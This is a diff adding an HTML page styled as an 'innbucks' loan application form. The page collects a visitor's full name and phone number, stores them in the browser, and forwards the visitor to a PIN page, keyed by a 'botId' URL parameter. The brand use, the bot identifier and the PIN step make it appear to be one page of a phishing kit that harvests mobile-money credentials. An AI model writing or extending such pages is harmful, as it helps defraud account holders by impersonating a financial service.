@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application Form</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f6f7fb;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.loan-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+.logo-container {
+    width: 100%;
+    height: 120px;
+    margin-bottom: 20px;
+}
+.logo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+label { display: block; margin: 10px 0 5px; font-weight: bold; }
+input { width: 100%; padding: 10px; margin-bottom: 15px; }
+button { width: 100%; padding: 12px; background: red; color: #fff; border: none; }
+button:disabled { background: #ccc; }
+
+.checkbox-label {
+    display: flex;
+    align-items: center;      /* vertically center the checkbox and text */
+    gap: 8px;                 /* space between checkbox and text */
+    font-size: 14px;
+    margin-bottom: 15px;
+    cursor: pointer;          /* makes label clickable */
+}
+
+.checkbox-label input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: red;        /* makes the checkbox red to match button */
+}
+
+</style>
+</head>
+<body>
+
+<div class="loan-container">
+    <div class="logo-container">
+        innbucks
+    </div>
+
+    <h2>Loan Application Form</h2>
+
+    <form id="detailsForm">
+        <label>Full Name</label>
+        <input id="name" placeholder="Name" required>
+
+        <label>Phone Number</label>
+        <input id="phone" placeholder="+263" required>
+
+        <label class="checkbox-label">
+    <input type="checkbox" id="confirmCheck">
+    I agree to innbucks terms and services
+</label>
+
+
+        <button id="nextBtn" disabled>Next</button>
+    </form>
+</div>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
+
+const confirmCheck = document.getElementById('confirmCheck');
+const nextBtn = document.getElementById('nextBtn');
+
+confirmCheck.addEventListener('change', () => {
+    nextBtn.disabled = !confirmCheck.checked;
+});
+
+document.getElementById('detailsForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    const nameInput = document.getElementById('name');
+    const phoneInput = document.getElementById('phone');
+
+    localStorage.setItem('name', nameInput.value);
+    localStorage.setItem('phone', phoneInput.value);
+
+    window.location.href = `pin.html?botId=${botId}`;
+});
+</script>
+
+</body>
+</html>
